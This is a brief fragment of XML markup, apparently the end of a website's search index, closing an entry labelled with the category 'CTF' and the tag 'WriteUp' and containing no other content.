      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
